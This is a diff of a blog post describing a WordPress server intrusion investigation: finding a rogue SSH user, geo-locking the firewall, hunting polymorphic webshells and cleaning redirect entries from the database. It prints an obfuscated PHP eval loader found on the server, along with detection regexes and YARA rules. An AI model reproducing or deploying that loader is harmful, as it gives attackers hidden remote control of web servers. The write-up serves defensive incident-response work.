@@ -87,7 +87,7 @@ Shout out to the following researchers who's content made this possible:
 ---
 
 ## Introduction
-The client contacted me, explaining that his server (which I had not seen before) has been 'hacked'. This server hosts about 30 different wordpress websites and upon loading certain features, the user would be redirected to `https://ushort.dev` and other similar URLs.  
+The client contacted me, explaining that his server (which I had not seen before) had been 'hacked'. This server hosts about 30 different wordpress websites and upon loading certain features, the user would be redirected to `https://ushort.dev` and other similar URLs.  
 
 I intentionally left out some parts of this investigation to prevent a bloated blog. But one of the early actions I took when accessing the server via SSH was to grep for the `ushort` string in the webroot of one of the affected sites to see what files come up. This only reveal temporary logs from cPanel based on actions already taken by the user which is what lead me to take a different approach.
 
@@ -117,6 +117,13 @@ grep "USERNAME" ~/.bash_history
 ```
 I found a user that stood out to me. I then found the user creation command in the root user's bash history account. The bash history had unix timestamps enabled and that user was created (according to the history timestamp) a minute before two other accounts which I know to be official.
 But when looking at `last` command's output, I enumerated their IP address with `ip-api.com` JSON API which showed me the user was connecting from a static IP in Washington DC. 
+I have my own alias on my host system to quickly enumerate an IP address:
+```bash
+enum_ip() {
+	ip_address=$1
+	curl -s "http://ip-api.com/json/$ip_address?fields=66846719" | jq
+}
+```
 
 None of the official users were in the USA so I flagged it and confirmed with my client. No one to his knowledge was operating out of the States. I didn't take any action on the user account yet as I wanted to script the removal of any connections and user accounts to prevent any counter attacks should the attackers be actively monitoring such actions.
 
@@ -128,13 +135,16 @@ ps -auxf
 # All open files showing process IDs and Connection status - Credit: John Strand
 lsof -i -P
 ```
-I then went back to the WHM interface and wanted to check the firewall settings. I found that the firewall was in 'debug' mode and wasn't active. As this was a local server hosting to only local companies and clients, I thought that I should geolock the server to disconnect any foreign clients immediately making it easier to work on and clean up. I then added the geolock and locked some of the ports I saw which were open and added the global xmlrpc deny rule, and blocked and removed the strange SSH user account.
+I then went back to the WHM interface and wanted to check the firewall settings. I found that the firewall was in 'debug' mode and wasn't active. As this was a local server hosting to only local companies and clients, I thought that I should geo-lock the server to disconnect any foreign clients immediately making it easier to work on and clean up. 
+
+I then added the geo-lock and locked some of the ports I saw which were open and added the global `xmlrpc` deny rule, and blocked and removed the strange SSH user account.
+Now I bought myself some time to dig... and dig I did :D
 
 ---
 
 ## Finding Persistence
 
-I checked the active connections again and saw that the only active connection was mine and the hosting provider. I then explained to Claude my findings and actions, and prompted it to help give me places to look for any malicious scripts.
+I checked the active connections again and saw that the only active connection was mine and the hosting provider. I then explained to Claude my findings and actions, and prompted it to help give me places to look for any malicious scripts based on the current evidences.
  
 The focus then turned to the /home directory and Claude gave me the following line:
 ```bash
@@ -148,7 +158,8 @@ find /home -name "script.php" > script_file_find_output.txt
 So I looked at the output and about the 10th line down, one line immediately stood out:  
 **`/home/REDACTED/cpmove.psql.1312886056/teaniou/ytdkrwn/iazvlpc/shell.php`**  
 This did not look normal but rather looked like an attempt to make it look like a temporary path of sorts or was a randomly generated path. I then opened it up with `vi` and had a look...
-At this point my heart started racing from excitement, I'm sure we all know the feeling. This is what I saw:
+
+At this point my heart started racing with excitement, I'm sure we all know the feeling. This is what I saw:
 ```php
 <?php
 $JIzk='file_ge'.'t'.'content'.'s';$YrdE='gzu'.'ncomp'.'ress';$esyt='s'.'ubs'.'tr';$DPAQ='st'.'r'.''.'re'.'place';$TprW='e'.'xit';eval($YrdE($DPAQ('xpkzchjbsq','>',$DPAQ('qpfxhbaelk','<',$esyt($JIzk( _FILE_ ),-217718)))));$TprW(0);
@@ -158,8 +169,10 @@ BOOM! Text book obfuscation, great. I then went back to my text file and looked 
 **`/home/REDACTED/public_html/images/npmrlch/cywartd/vjaqbug/shell.php`**  
 **`/home/REDACTED/public_html/modules/mod_login/elhywdo/cuywi1b/bwsax1e/shell.php`**  
 **`/home/REDACTED/public_html/images/sfvratq/heyxoca/pvynrqk/shell.php`**  
+
 In each of them I saw the obfuscation was slightly different and the variable names were completely different everytime but still easy enough to read but one thing stood out amongst them all **`(__FILE__),-OFFSET`**  
 I then asked Claude to give me the best way to find all of these files across the file system using this regex **`\( __FILE__ \),-[0-9]+`** 
+In hide sight, this was not the best way to find them but it worked.
 ```bash
 # Find all the php files with this pattern in them under first all the webroot folders then the filesystem
 grep -rnP '\( __FILE__ \),-[0-9]+' --include="*.php" /home/*/public_html/ >> possible_malware.txt
@@ -169,7 +182,7 @@ grep -rnP '\( __FILE__ \),-[0-9]+' --include="*.php" / >> possible_malware.txt
 :%!sort -u
 ```
 I started with only the webroots but after seeing how quickly it output results outside of what I had already found, I then switched to the root filesystem. A few minutes later, I sat with a 216 unique instances across the file system.  
-> See the companion [Malware Analysis](../malware-analysis/2026-06-27-polymorphic-webshell-analysis.md) for breakdown of the shell's obfuscation and polymorphism mechanisms.
+> See the companion [Malware Analysis](../malware-analysis/2026-06-27-polymorphic-webshell-analysis.md) for breakdown of the shell's obfuscation mechanisms.
 
 ---
 
@@ -181,6 +194,9 @@ The next thing I had to check were the database tables. The following tables wer
 
 In wp-options the **home** column had a `ushort` link in it, redirecting any visitor to the phising site.
 A custom bash script was used to clean up all the database entries.
+
+All this script did was to use the wp cli tool to clean up the tables, but this was not perfect and did not catch everything.
+I would later create another bash script that iterates through each table and column to find these patterns and flush them out.
 ```bash
 #!/usr/bin/bash
 WP_CLI="/usr/local/bin/wp"
@@ -221,10 +237,10 @@ done
 ```
 ---
 
-## Conclusion
-At this point it was about 4AM and had to get ready for my day job. I compiled my hours,findings and report and sent it to the client. I did not include all the details of the entire investigation but tried to give the highlights of the juicy bits. Hopefully this helps others to find the IOCs and stop any future or existing compromises.  
+## End of the First Day...
+At this point it was about 4AM and had to get ready for my day job. I compiled my hours, findings and report and sent it to the client. I did not include all the details of the entire investigation but tried to give the highlights of the juicy bits. Hopefully this helps others to find the IOCs and stop any future or existing compromises.  
 
-If anything seen in this blog is incorrect, can be improved or you would like to offer any advice, I welcome it. I'd rather be wrong and learn, than to remain ignorant.
+But wait... there is more to come. In the very near future I will share the additional days of this investigation.
 
 ---
 
@@ -410,6 +426,10 @@ grep -rnP "\\\$[A-Za-z0-9_]{1,32}\s*=\s*('[A-Za-z0-9_]+'\s*\.\s*){1,}'[A-Za-z0-9
 
 # Look for any suspicious shell sessions and from which IP they originate 
 last
+# Check if the suspcious username appears in the bash history
+grep "USERNAME" ~/.bash_history
+# Decode the unix timestamp in .bash_history
+date -d @1782931826
 
 # Find world writable directories on the system - possible places to find foreign files
 find / -xdev -perm /1000 -type d
@@ -475,7 +495,9 @@ cat /etc/crontab
 ls /etc/cron.*
 
 # Find all user accounts with shell access
+grep "/bin/bash" /etc/passwd
 cat /etc/passwd | grep -vE "nologin|false|sync"
+sort -n -t: /etc/passwd | grep -vE "nologin|noshell|false|halt|shutdown|sync"
 ```
 
 ### Custom YARA Rules (Using Yara-X)
@@ -568,6 +590,11 @@ rule Detect_UShortLinks {
                 (any of ($php*) or any of ($html*)) and $pattern
 }
 ```
+
+## Contact Me
+
+If anything seen in this blog is incorrect, can be improved or you would like to offer any advice, I welcome it. I'd rather be wrong and learn, than to remain ignorant.
+
 
 ---
 
